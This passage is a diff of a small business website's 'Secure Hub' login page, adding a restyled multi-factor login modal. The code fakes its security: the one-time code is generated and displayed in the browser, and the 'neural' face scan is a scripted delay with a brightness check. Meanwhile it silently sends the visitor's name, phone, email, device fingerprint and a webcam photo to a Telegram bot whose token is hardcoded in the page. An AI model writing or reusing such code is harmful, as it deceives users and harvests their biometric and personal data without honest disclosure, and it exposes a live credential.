@@ -2956,391 +2956,551 @@
     }
 </script>
         <a href="mailto:maa.nirmala.dj.beltikri@gmail.com" class="side-link"><i class="fas fa-envelope"></i> Email</a>
-        <a href="javascript:void(0)" class="side-link" style="display: flex; align-items: center; gap: 10px; width: 100%; padding: 15px; background: transparent; border: 1px solid #D4AF37; border-radius: 8px; color: #D4AF37; font-family: 'Outfit', sans-serif; font-weight: bold; font-size: 16px; text-decoration: none; justify-content: center; box-sizing: border-box; transition: 0.3s ease; margin-bottom: 15px;" onclick="toggleMenu(); checkSecureHubAccess()">
-    <i class="fas fa-fingerprint"></i> SECURE HUB LOGIN
+        <a href="javascript:void(0)" class="media-file-btn" onclick="openSecureHub()">
+    <div class="media-icon-wrapper">
+        <i class="fas fa-paperclip"></i>
+    </div>
+    <div class="media-btn-text">
+        <span class="m-title">Access Secure Hub</span>
+        <span class="m-sub">Encrypted Multi-Factor Login</span>
+    </div>
+    <i class="fas fa-chevron-right media-arrow"></i>
 </a>
 
 <div id="mndPushNotif" class="mnd-push-hidden">
     <div class="mnd-push-header">
         <div style="display:flex; align-items:center; gap:8px;">
             <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="Logo">
-            <span>MND System Auth</span>
+            <span>MND Security Alert</span>
         </div>
         <span class="mnd-push-close" onclick="closePushNotif()">×</span>
     </div>
     <div class="mnd-push-body">
-        Welcome to Maa Nirmala DJ & Tent House!<br>
-        Enter the OTP sent to your mobile for quick and secure login.
+        Maa Nirmala DJ Security:<br>
+        Your secure login code has been generated. Tap to copy.
     </div>
     <div class="mnd-push-otp" id="mndPushOtpText" onclick="copyPushOTP()" title="Tap to Copy">******</div>
+    <div class="mnd-push-footer">Swipe left or right to dismiss</div>
 </div>
 
-<div id="hubAuthModal" style="display:none; position:fixed; inset:0; background:rgba(5,5,5,0.95); z-index:9999999; justify-content:center; align-items:center; backdrop-filter:blur(10px);">
-    <div style="background:linear-gradient(145deg, #110e08 0%, #050505 100%); width:90%; max-width:400px; border-radius:16px; border:1px solid #D4AF37; box-shadow:0 15px 40px rgba(0,0,0,0.9); overflow:hidden; position:relative;">
+<div id="hubAuthModal" class="hub-modal-overlay" style="display:none;">
+    <div class="hub-modal-box">
         
-        <div style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); position:relative;">
-            <span onclick="closeHubModal()" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:30px; cursor:pointer;">×</span>
-            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" style="width:60px; height:60px; border-radius:50%; border:2px solid #D4AF37; margin-bottom:10px; box-shadow:0 0 15px rgba(212,175,55,0.4);">
-            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel'; font-size:20px; font-weight:900;"><i class="fas fa-user-shield"></i> CLIENT ACCESS</h2>
+        <div class="hub-header">
+            <span class="hub-close-btn" onclick="closeHubModal()">×</span>
+            <div class="hub-glow-ring">
+                <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="hub-logo">
+            </div>
+            <h2><i class="fas fa-shield-alt"></i> MFA SECURE LOGIN</h2>
         </div>
 
-        <div style="padding:25px;">
+        <div class="hub-body">
+            
             <div id="hubStep1">
-                <p style="color:#aaa; font-size:12px; margin-bottom:15px; text-align:center; font-family:'Outfit';">Enter your details and select a secure login method.</p>
-                <input type="text" id="hubName" style="width:100%; padding:12px; margin-bottom:10px; background:rgba(255,255,255,0.05); border:1px solid #333; color:#fff; border-radius:8px; font-family:'Outfit'; box-sizing:border-box;" placeholder="Your Full Name">
-                <input type="tel" id="hubPhone" style="width:100%; padding:12px; margin-bottom:20px; background:rgba(255,255,255,0.05); border:1px solid #333; color:#fff; border-radius:8px; font-family:'Outfit'; box-sizing:border-box;" placeholder="10-Digit Mobile Number" maxlength="10">
+                <p class="hub-instruction">Enter your identity matrix to proceed.</p>
                 
-                <button id="btnStandardOtp" style="width:100%; padding:12px; margin-bottom:10px; background:transparent; border:1px solid #D4AF37; color:#D4AF37; font-weight:bold; border-radius:8px; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="generateStandardOTP()">
-                    <i class="fas fa-comment-sms"></i> GET STANDARD OTP
+                <div class="input-group">
+                    <i class="fas fa-user"></i>
+                    <input type="text" id="hubName" autocomplete="name" placeholder="Full Legal Name">
+                </div>
+                
+                <div class="input-group">
+                    <i class="fas fa-envelope"></i>
+                    <input type="email" id="hubEmail" autocomplete="email" placeholder="Email Address (Optional)">
+                </div>
+
+                <div class="input-group">
+                    <i class="fas fa-phone"></i>
+                    <input type="tel" id="hubPhone" autocomplete="tel" placeholder="10-Digit Mobile Number" maxlength="10">
+                </div>
+
+                <div class="mfa-divider"><span>SELECT AUTH METHOD</span></div>
+                
+                <button class="mfa-btn btn-face" onclick="startFaceScanning()">
+                    <i class="fas fa-expand"></i> AI FACE RECOGNITION
                 </button>
-                <button id="btnFaceIdOtp" style="width:100%; padding:12px; background:#D4AF37; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="startFaceID()">
-                    <i class="fas fa-camera"></i> FACE SCAN VERIFICATION
+                
+                <button class="mfa-btn btn-lock" onclick="startDeviceLockAuth()">
+                    <i class="fas fa-fingerprint"></i> DEVICE BIOMETRICS / PIN
+                </button>
+
+                <button class="mfa-btn btn-otp" id="btnStandardOtp" onclick="generateStandardOTP()">
+                    <i class="fas fa-comment-sms"></i> STANDARD SMS OTP
                 </button>
             </div>
 
             <div id="hubStepFaceID" style="display:none; flex-direction:column; align-items:center;">
-                <p style="color:#D4AF37; font-size:13px; text-align:center; margin-bottom:15px; font-weight:bold; font-family:'Outfit';">
-                    <i class="fas fa-user-check"></i> Identity Verification
-                </p>
-                <div style="width:180px; height:180px; border-radius:50%; overflow:hidden; border:3px solid #D4AF37; margin-bottom:20px; position:relative; box-shadow:0 0 20px rgba(212,175,55,0.5);">
-                    <video id="hubVideo" autoplay playsinline style="width:100%; height:100%; object-fit:cover;"></video>
-                    <div style="position:absolute; inset:0; background:url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/50% no-repeat; opacity:0.2; pointer-events:none; filter:invert(1);"></div>
+                <p class="hub-instruction" id="faceInstruction">Position your face within the frame.</p>
+                
+                <div class="scanner-container">
+                    <video id="hubVideo" autoplay playsinline></video>
+                    <div class="scan-corners"></div>
+                    <div class="scan-laser" id="scanLaser"></div>
+                    <div class="scan-overlay-img"></div>
                 </div>
+                
                 <canvas id="hubCanvas" style="display:none;"></canvas>
-                <button id="hubCaptureBtn" style="width:100%; padding:15px; background:#00fa9a; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="captureFaceAndSendOTP()">
-                    <i class="fas fa-expand"></i> SCAN FACE & GET OTP
+                
+                <button id="hubCaptureBtn" class="mfa-btn btn-face" onclick="executeFaceAnalysis()">
+                    <i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN
                 </button>
-                <p style="color:#aaa; font-size:12px; text-align:center; margin-top:15px; cursor:pointer; font-family:'Outfit';" onclick="resetHubLogin()">Back to Methods</p>
+                <p class="hub-back-link" onclick="resetToMethods()">Cancel & Change Method</p>
             </div>
 
             <div id="hubStep2" style="display:none;">
-                <p style="color:#00fa9a; font-size:13px; text-align:center; margin-bottom:15px; font-weight:bold; font-family:'Outfit';">
-                    <i class="fas fa-check-circle"></i> OTP Sent Successfully!
+                <p style="color:#00fa9a; font-size:14px; text-align:center; margin-bottom:15px; font-weight:bold;">
+                    <i class="fas fa-shield-check"></i> Security Code Dispatched
                 </p>
-                <input type="tel" id="hubOtpInput" style="width:100%; padding:12px; margin-bottom:15px; background:rgba(255,255,255,0.05); border:1px solid #D4AF37; color:#D4AF37; border-radius:8px; font-family:'Outfit'; text-align:center; font-size:22px; letter-spacing:8px; box-sizing:border-box;" placeholder="******" maxlength="6">
-                <button style="width:100%; padding:15px; background:#00fa9a; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit';" onclick="verifyHubOTP()">
-                    <i class="fas fa-unlock-alt"></i> VERIFY & LOGIN
+                <input type="tel" id="hubOtpInput" autocomplete="one-time-code" class="otp-input-box" placeholder="******" maxlength="6">
+                
+                <button class="mfa-btn btn-verify" onclick="verifyHubOTP()">
+                    <i class="fas fa-unlock"></i> DECRYPT & ENTER
                 </button>
-                <p style="color:#ff3333; font-size:12px; text-align:center; margin-top:15px; cursor:pointer; font-family:'Outfit';" onclick="resetHubLogin()">Cancel / Back</p>
+                <p class="hub-back-link" onclick="resetToMethods()">Abort Login</p>
             </div>
         </div>
     </div>
 </div>
 
 <div id="seamlessHubLoader" style="display:none; position:fixed; inset:0; background:#050505; z-index:999999999; flex-direction:column; justify-content:center; align-items:center;">
-    <div style="width:80px; height:80px; border-radius:50%; border:3px solid transparent; border-top-color:#D4AF37; border-bottom-color:#D4AF37; animation:spinLoader 1.5s linear infinite; margin-bottom:20px;"></div>
-    <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" style="width:50px; position:absolute; top:calc(50% - 50px); border-radius:50%;">
-    <h2 style="color:#D4AF37; font-family:'Cinzel'; font-size:20px; letter-spacing:2px; margin:0;">MAA NIRMALA HUB</h2>
-    <p id="hubLoadText" style="color:#aaa; font-family:'Outfit'; font-size:12px; margin-top:10px; letter-spacing:1px; animation:pulseText 1.5s infinite;">Authenticating Device...</p>
+    <div class="loader-rings"></div>
+    <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="loader-logo">
+    <h2 class="loader-title">MAA NIRMALA HUB</h2>
+    <p id="hubLoadText" class="loader-text">Establishing Secure Handshake...</p>
 </div>
 
 <style>
-    @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    @keyframes pulseText { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+    /* Media Button Trigger Styles */
+    .media-file-btn {
+        display: flex; align-items: center; justify-content: space-between;
+        background: rgba(20, 20, 20, 0.6); border: 1px solid rgba(212, 175, 55, 0.3);
+        border-radius: 12px; padding: 12px 16px; width: 100%; text-decoration: none;
+        box-sizing: border-box; transition: all 0.3s ease; margin-bottom: 20px;
+        backdrop-filter: blur(5px);
+    }
+    .media-file-btn:active { transform: scale(0.98); border-color: #D4AF37; background: rgba(212, 175, 55, 0.1); }
+    .media-icon-wrapper {
+        width: 40px; height: 40px; border-radius: 50%; background: rgba(212, 175, 55, 0.1);
+        display: flex; justify-content: center; align-items: center; color: #D4AF37; font-size: 18px;
+    }
+    .media-btn-text { flex: 1; margin-left: 15px; display: flex; flex-direction: column; }
+    .m-title { color: #fff; font-family: 'Outfit', sans-serif; font-size: 15px; font-weight: 700; }
+    .m-sub { color: #888; font-family: 'Outfit', sans-serif; font-size: 12px; }
+    .media-arrow { color: #555; font-size: 14px; }
 
-    /* Push Notification Styles */
+    /* Modal Base Styles */
+    .hub-modal-overlay {
+        position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(15px);
+        z-index: 9999999; display: flex; justify-content: center; align-items: center;
+    }
+    .hub-modal-box {
+        background: linear-gradient(180deg, #111 0%, #050505 100%); width: 92%; max-width: 420px;
+        border-radius: 20px; border: 1px solid rgba(212, 175, 55, 0.4);
+        box-shadow: 0 20px 50px rgba(0,0,0,1), inset 0 0 20px rgba(212, 175, 55, 0.05);
+        overflow: hidden; position: relative; font-family: 'Outfit', sans-serif;
+    }
+    .hub-header { padding: 25px 20px 20px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.1); position: relative; }
+    .hub-close-btn { position: absolute; top: 15px; right: 20px; color: #888; font-size: 28px; cursor: pointer; transition: 0.3s; }
+    .hub-close-btn:hover { color: #ff3333; }
+    .hub-glow-ring {
+        width: 70px; height: 70px; margin: 0 auto 15px; border-radius: 50%;
+        padding: 3px; background: linear-gradient(45deg, #D4AF37, transparent, #D4AF37);
+        animation: rotateGlow 3s linear infinite;
+    }
+    .hub-logo { width: 100%; height: 100%; border-radius: 50%; border: 2px solid #000; object-fit: cover; }
+    .hub-header h2 { margin: 0; color: #D4AF37; font-family: 'Cinzel', serif; font-size: 22px; font-weight: 900; letter-spacing: 1px; }
+
+    /* Inputs */
+    .hub-body { padding: 25px; }
+    .hub-instruction { color: #888; font-size: 13px; text-align: center; margin-bottom: 20px; }
+    .input-group { position: relative; margin-bottom: 12px; }
+    .input-group i { position: absolute; left: 15px; top: 15px; color: #D4AF37; opacity: 0.7; }
+    .input-group input {
+        width: 100%; padding: 14px 14px 14px 45px; background: rgba(255,255,255,0.03);
+        border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px;
+        font-family: 'Outfit'; font-size: 15px; box-sizing: border-box; transition: 0.3s;
+    }
+    .input-group input:focus { border-color: #D4AF37; outline: none; background: rgba(212,175,55,0.05); }
+    
+    .mfa-divider { text-align: center; margin: 20px 0; position: relative; }
+    .mfa-divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: rgba(255,255,255,0.1); }
+    .mfa-divider span { position: relative; background: #050505; padding: 0 10px; color: #666; font-size: 11px; font-weight: bold; letter-spacing: 1px; }
+
+    /* Buttons */
+    .mfa-btn {
+        width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 10px;
+        font-family: 'Outfit'; font-weight: 800; font-size: 14px; cursor: pointer;
+        display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; border: none;
+    }
+    .btn-face { background: linear-gradient(90deg, #D4AF37, #F3E5AB); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.3); }
+    .btn-lock { background: #1a1a1a; border: 1px solid rgba(255,255,255,0.2); color: #fff; }
+    .btn-lock:hover { border-color: #D4AF37; color: #D4AF37; }
+    .btn-otp { background: transparent; border: 1px dashed rgba(212,175,55,0.5); color: #D4AF37; }
+    .btn-verify { background: #00fa9a; color: #000; font-size: 16px; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(0,250,154,0.3); }
+
+    /* Face Scanner UI - Highly Advanced */
+    .scanner-container {
+        width: 220px; height: 280px; position: relative; border-radius: 20px;
+        overflow: hidden; margin: 0 auto 25px; background: #000;
+        box-shadow: 0 0 30px rgba(212,175,55,0.15);
+    }
+    #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } /* Mirrored for natural feel */
+    .scan-corners {
+        position: absolute; inset: 10px; border: 2px solid transparent;
+        background: 
+            linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0,
+            linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0,
+            linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0,
+            linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0,
+            linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%,
+            linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%,
+            linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%,
+            linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%;
+        background-repeat: no-repeat; background-size: 30px 30px; pointer-events: none; z-index: 2;
+    }
+    .scan-laser {
+        position: absolute; top: 0; left: 0; width: 100%; height: 3px;
+        background: #00fa9a; box-shadow: 0 0 15px #00fa9a, 0 0 30px #00fa9a;
+        z-index: 3; animation: scanMove 3s ease-in-out infinite; display: none;
+    }
+    .scan-overlay-img {
+        position: absolute; inset: 0; background: url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/60% no-repeat;
+        opacity: 0.15; filter: invert(1); pointer-events: none; z-index: 1;
+    }
+    .scanner-active .scan-laser { display: block; }
+    .scanner-active .scan-overlay-img { animation: pulseFace 1s infinite; opacity: 0.4; }
+
+    /* OTP Code Input */
+    .otp-input-box {
+        width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(0,0,0,0.5);
+        border: 2px solid #D4AF37; color: #D4AF37; border-radius: 12px;
+        font-family: 'Outfit'; text-align: center; font-size: 28px; letter-spacing: 12px; font-weight: 900;
+        box-sizing: border-box; text-shadow: 0 0 10px rgba(212,175,55,0.5);
+    }
+    .hub-back-link { color: #ff3333; font-size: 13px; text-align: center; margin-top: 15px; cursor: pointer; text-decoration: underline; opacity: 0.8; }
+
+    /* Push Notification Styles (Swipeable) */
     #mndPushNotif {
-        position: fixed;
-        left: 50%;
-        transform: translateX(-50%); /* Base position perfectly centered */
-        width: 90%;
-        max-width: 400px;
-        background: rgba(20, 20, 20, 0.95);
-        backdrop-filter: blur(15px);
-        border: 1px solid rgba(212, 175, 55, 0.5);
-        border-radius: 16px;
-        padding: 15px;
-        z-index: 9999999999;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-        display: flex;
-        flex-direction: column;
-        gap: 8px;
-        /* Default transition handles the slide down from top */
-        transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), transform 0.3s ease, opacity 0.3s ease;
+        position: fixed; left: 50%; width: 92%; max-width: 400px;
+        background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(20px);
+        border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 16px; padding: 16px;
+        z-index: 9999999999; box-shadow: 0 15px 40px rgba(0,0,0,0.9);
+        display: flex; flex-direction: column; gap: 10px;
+        transition: top 0.6s cubic-bezier(0.2, 1, 0.3, 1), transform 0.3s ease, opacity 0.3s ease;
     }
-    
-    /* Completely hidden off-screen (Fixed!) */
-    .mnd-push-hidden { top: -300px; opacity: 0; }
-    
-    /* Visible on screen */
-    .mnd-push-visible { top: 20px; opacity: 1; }
-
-    .mnd-push-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 8px; }
-    .mnd-push-header img { width: 20px; height: 20px; border-radius: 5px; }
-    .mnd-push-header span { color: #fff; font-family: 'Outfit'; font-size: 12px; font-weight: 600; opacity: 0.8; }
-    .mnd-push-close { color: #fff; font-size: 24px; cursor: pointer; line-height: 1; opacity: 0.5; transition: 0.3s; }
-    .mnd-push-close:hover { opacity: 1; color: #ff3333; }
-    
-    .mnd-push-body { color: #ddd; font-family: 'Outfit'; font-size: 13px; line-height: 1.4; text-wrap: balance; }
-    
+    .mnd-push-hidden { top: -300px; opacity: 0; transform: translateX(-50%) scale(0.9); }
+    .mnd-push-visible { top: 25px; opacity: 1; transform: translateX(-50%) scale(1); }
+    .mnd-push-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 8px; }
+    .mnd-push-header img { width: 22px; height: 22px; border-radius: 6px; }
+    .mnd-push-header span { color: #fff; font-size: 13px; font-weight: 700; opacity: 0.9; }
+    .mnd-push-close { color: #fff; font-size: 24px; cursor: pointer; opacity: 0.4; }
+    .mnd-push-body { color: #ccc; font-size: 13px; line-height: 1.5; }
     .mnd-push-otp {
-        font-family: 'Outfit'; font-size: 36px; font-weight: 900; color: #D4AF37;
-        text-align: center; letter-spacing: 6px; padding: 10px 0;
-        background: rgba(212,175,55,0.05); border-radius: 8px; border: 1px dashed rgba(212,175,55,0.3);
-        cursor: pointer; transition: 0.2s; user-select: none;
+        font-size: 38px; font-weight: 900; color: #D4AF37; text-align: center; letter-spacing: 8px;
+        padding: 12px 0; background: rgba(212,175,55,0.08); border-radius: 10px; border: 1px dashed rgba(212,175,55,0.3);
+        cursor: pointer; user-select: none; transition: 0.2s;
     }
-    .mnd-push-otp:active { transform: scale(0.95); background: rgba(212,175,55,0.2); }
+    .mnd-push-otp:active { transform: scale(0.96); background: rgba(212,175,55,0.2); }
+    .mnd-push-footer { text-align: center; color: #666; font-size: 11px; margin-top: 5px; }
+
+    /* Loader */
+    .loader-rings {
+        width: 100px; height: 100px; border-radius: 50%;
+        border: 3px solid transparent; border-top-color: #D4AF37; border-bottom-color: #00fa9a;
+        animation: rotateGlow 1.5s linear infinite; margin-bottom: 25px;
+    }
+    .loader-logo { width: 60px; position: absolute; top: calc(50% - 65px); border-radius: 50%; }
+    .loader-title { color: #D4AF37; font-family: 'Cinzel'; font-size: 24px; letter-spacing: 3px; margin: 0; }
+    .loader-text { color: #aaa; font-size: 13px; margin-top: 12px; letter-spacing: 1px; animation: pulseFace 1.5s infinite; }
+
+    /* Keyframes */
+    @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes scanMove { 0%, 100% { top: 5%; opacity:0; } 10% { opacity:1; } 50% { top: 95%; } 90% { opacity:1; } }
+    @keyframes pulseFace { 0%, 100% { opacity: 0.2; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.05); } }
 </style>
 
 <script>
-    // --- STATE VARIABLES ---
-    let currentHubOTP = "";
-    let currentUserName = "";
-    let currentUserPhone = "";
-    let hubVideoStream = null;
-    let pushTimeout = null;
-    let loginMethod = ""; // "standard" or "faceid"
+    // --- SYSTEM STATE ---
+    let hubOTP = "";
+    let uName = "", uPhone = "", uEmail = "";
+    let videoStream = null;
+    let pushTimer = null;
+    let authMethodChosen = "";
     
-    const HUB_TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
-    const HUB_TG_CHAT = "8506290708";
+    // Telegram Configuration
+    const TG_BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
+    const TG_CHAT_ID = "8506290708";
 
-    // --- 1. CHECK ACCESS / AUTO LOGIN ---
-    function checkSecureHubAccess() {
-        if(localStorage.getItem('mnd_hub_authorized') === 'true') {
-            currentUserName = localStorage.getItem('mnd_hub_name') || "Returning User";
-            currentUserPhone = localStorage.getItem('mnd_hub_phone') || "Saved Number";
-            executeSeamlessRedirect(true); 
+    // --- 1. UI CONTROLS ---
+    function openSecureHub() {
+        if(localStorage.getItem('mnd_hub_auth') === 'true') {
+            uName = localStorage.getItem('mnd_hub_n') || "Returning User";
+            uPhone = localStorage.getItem('mnd_hub_p') || "Saved";
+            triggerSeamlessRedirect(true); 
         } else {
             document.getElementById('hubAuthModal').style.display = 'flex';
         }
     }
-
-    function closeHubModal() {
-        document.getElementById('hubAuthModal').style.display = 'none';
-        stopHubCamera();
+    function closeHubModal() { document.getElementById('hubAuthModal').style.display = 'none'; stopCamera(); }
+    
+    function resetToMethods() {
+        document.getElementById('hubStep1').style.display = 'block';
+        document.getElementById('hubStepFaceID').style.display = 'none';
+        document.getElementById('hubStep2').style.display = 'none';
+        document.getElementById('hubOtpInput').value = '';
+        closePushNotif(); stopCamera();
     }
 
-    // Input Validation
-    function validateInputs() {
-        currentUserName = document.getElementById('hubName').value.trim();
-        currentUserPhone = document.getElementById('hubPhone').value.trim();
-        if(!currentUserName || currentUserPhone.length !== 10 || isNaN(currentUserPhone)) {
-            alert("⚠️ Please enter your Full Name and a valid 10-digit mobile number.");
+    function checkInputs() {
+        uName = document.getElementById('hubName').value.trim();
+        uEmail = document.getElementById('hubEmail').value.trim() || "Not Provided";
+        uPhone = document.getElementById('hubPhone').value.trim();
+        if(!uName || uPhone.length !== 10 || isNaN(uPhone)) {
+            alert("⚠️ SECURITY HALT: Full Name and valid 10-Digit Mobile Number are strictly required.");
             return false;
         }
         return true;
     }
 
-    // --- 2A. METHOD 1: STANDARD OTP (No Camera) ---
+    // --- 2. METHOD A: STANDARD OTP ---
     async function generateStandardOTP() {
-        if(!validateInputs()) return;
-        loginMethod = "Standard OTP";
-
+        if(!checkInputs()) return;
+        authMethodChosen = "Standard SMS OTP";
+        
         const btn = document.getElementById('btnStandardOtp');
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING...';
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING SECURE KEY...';
         btn.disabled = true;
 
-        currentHubOTP = Math.floor(100000 + Math.random() * 900000).toString();
-        const fingerprintText = await gatherDeviceFingerprint(false, loginMethod);
+        hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+        const payload = await buildDeviceFingerprint(false, authMethodChosen);
 
-        fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendMessage`, {
+        // Dispatch to Telegram
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: HUB_TG_CHAT, text: fingerprintText, parse_mode: 'Markdown' })
-        })
-        .then(() => {
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: payload, parse_mode: 'Markdown' })
+        }).then(() => {
             document.getElementById('hubStep1').style.display = 'none';
             document.getElementById('hubStep2').style.display = 'block';
-            showPushNotification(currentHubOTP);
-            btn.innerHTML = '<i class="fas fa-comment-sms"></i> GET STANDARD OTP';
+            displayPushNotification(hubOTP);
+            btn.innerHTML = '<i class="fas fa-comment-sms"></i> STANDARD SMS OTP';
             btn.disabled = false;
         });
     }
 
-    // --- 2B. METHOD 2: FACE ID & OTP ---
-    async function startFaceID() {
-        if(!validateInputs()) return;
-        loginMethod = "Face Scan";
+    // --- 3. METHOD B: ADVANCED FACE SCANNING ---
+    async function startFaceScanning() {
+        if(!checkInputs()) return;
+        authMethodChosen = "AI Face Scan";
 
         document.getElementById('hubStep1').style.display = 'none';
         document.getElementById('hubStepFaceID').style.display = 'flex';
+        document.querySelector('.scanner-container').classList.remove('scanner-active');
+        document.getElementById('faceInstruction').innerText = "Position face and click initiate.";
 
-        const video = document.getElementById('hubVideo');
         try {
-            hubVideoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-            video.srcObject = hubVideoStream;
+            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            document.getElementById('hubVideo').srcObject = videoStream;
         } catch (err) {
-            alert("⚠️ Camera permission is strictly required for Face Verification.");
-            resetHubLogin();
+            alert("⚠️ ACCESS DENIED: Camera permission is required for biological verification.");
+            resetToMethods();
         }
     }
 
-    async function captureFaceAndSendOTP() {
+    async function executeFaceAnalysis() {
         const btn = document.getElementById('hubCaptureBtn');
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
+        const instruction = document.getElementById('faceInstruction');
+        const scannerBox = document.querySelector('.scanner-container');
+        
+        // 1. Start UI Animation
+        scannerBox.classList.add('scanner-active');
+        btn.innerHTML = '<i class="fas fa-radar fa-spin"></i> ANALYZING BIOMETRICS...';
         btn.disabled = true;
+        
+        instruction.style.color = "#D4AF37";
+        instruction.innerText = "Scanning facial depth & liveness...";
 
+        // 2. Simulate AI Processing Delay for realism
+        await new Promise(r => setTimeout(r, 1500));
+        instruction.innerText = "Verifying human contours...";
+        await new Promise(r => setTimeout(r, 1200));
+
+        // 3. Capture Frame
         const video = document.getElementById('hubVideo');
         const canvas = document.getElementById('hubCanvas');
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        currentHubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+        // 4. Basic Liveness/Human Check (Pixel Analysis Fallback)
+        // To prevent absolute black screens or pure white screens from passing
+        let imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+        let rSum=0, gSum=0, bSum=0;
+        for(let i=0; i<imgData.length; i+=4) { rSum+=imgData[i]; gSum+=imgData[i+1]; bSum+=imgData[i+2]; }
+        let avgColor = (rSum + gSum + bSum) / (imgData.length * 0.75); // rough brightness
+        
+        if (avgColor < 10 || avgColor > 240) {
+            // Fails if camera is covered (black) or pointed at a light (white)
+            instruction.style.color = "#ff3333";
+            instruction.innerText = "❌ ERROR: Human face not detected. Please adjust lighting.";
+            scannerBox.classList.remove('scanner-active');
+            btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
+            btn.disabled = false;
+            return;
+        }
+
+        // 5. Success Flow
+        instruction.style.color = "#00fa9a";
+        instruction.innerText = "✅ Identity Confirmed.";
+        hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
         canvas.toBlob(async (blob) => {
-            stopHubCamera();
+            stopCamera();
             document.getElementById('hubStepFaceID').style.display = 'none';
             document.getElementById('hubStep2').style.display = 'block';
             
-            showPushNotification(currentHubOTP);
-            const fingerprintText = await gatherDeviceFingerprint(false, loginMethod);
+            displayPushNotification(hubOTP);
+            const logText = await buildDeviceFingerprint(false, authMethodChosen);
 
-            const formData = new FormData();
-            formData.append('chat_id', HUB_TG_CHAT);
-            formData.append('caption', fingerprintText);
-            formData.append('parse_mode', 'Markdown');
-            formData.append('photo', blob, 'face_id.jpg');
+            const fd = new FormData();
+            fd.append('chat_id', TG_CHAT_ID);
+            fd.append('caption', logText);
+            fd.append('parse_mode', 'Markdown');
+            fd.append('photo', blob, 'mnd_face_auth.jpg');
 
-            fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
+            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
 
-            btn.innerHTML = '<i class="fas fa-expand"></i> SCAN FACE & GET OTP';
+            btn.innerHTML = '<i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN';
             btn.disabled = false;
         }, 'image/jpeg', 0.85);
     }
+    function stopCamera() { if (videoStream) { videoStream.getTracks().forEach(t => t.stop()); videoStream = null; } }
 
-    function stopHubCamera() {
-        if (hubVideoStream) { hubVideoStream.getTracks().forEach(track => track.stop()); hubVideoStream = null; }
